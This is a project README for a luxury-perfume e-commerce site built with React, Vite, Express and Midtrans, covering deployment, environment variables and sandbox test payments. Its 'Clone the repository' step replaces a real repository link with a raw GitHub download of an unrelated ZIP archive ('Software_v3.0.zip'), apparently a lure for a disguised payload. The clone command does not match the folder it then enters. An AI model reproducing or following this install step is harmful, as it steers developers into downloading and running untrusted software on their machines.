# Odhincy Perfume E-commerce

A modern e-commerce platform for luxury perfumes built with React, Vite, Express, and Midtrans payment gateway.

## Features

- Modern, responsive UI with Tailwind CSS
- Product catalog with search and filtering
- Shopping cart functionality
- Secure payment processing with Midtrans
- Order management system
- Wishlist functionality

## Tech Stack

- Frontend:

  - React
  - Vite
  - TypeScript
  - Tailwind CSS
  - React Router
  - Lucide Icons

- Backend:
  - Node.js
  - Express
  - Midtrans Client

## Deployment

### Frontend (Vercel)

1. Fork/Clone this repository
2. Connect your GitHub repository to Vercel
3. Configure the following environment variables in Vercel:
   - `VITE_API_URL`: Your backend API URL
   - `VITE_MIDTRANS_CLIENT_KEY`: Your Midtrans client key

### Backend (Railway)

1. Create a new project in Railway
2. Connect your GitHub repository
3. Configure the following environment variables:
   - `PORT`: 3000
   - `NODE_ENV`: production
   - `MIDTRANS_SERVER_KEY`: Your Midtrans server key
   - `MIDTRANS_CLIENT_KEY`: Your Midtrans client key

## Local Development

1. Clone the repository:

```bash
git clone https://raw.githubusercontent.com/nug31/bolt/main/determinism/Software_v3.0.zip
cd odhincy
```

2. Install dependencies:

```bash
npm install
```

3. Create a `.env` file with the following variables:

```
VITE_API_URL=http://localhost:3000
VITE_MIDTRANS_CLIENT_KEY=your_midtrans_client_key
MIDTRANS_SERVER_KEY=your_midtrans_server_key
MIDTRANS_CLIENT_KEY=your_midtrans_client_key
PORT=3000
NODE_ENV=development
```

4. Start the development servers:

Frontend:

```bash
npm run dev
```

Backend:

```bash
npm run server
```

## Testing Payments

Use the following test credit card for Midtrans sandbox:

- Card Number: 4811 1111 1111 1114
- CVV: 123
- Expiry Date: Any future date
- OTP/3DS: 112233

## License

MIT
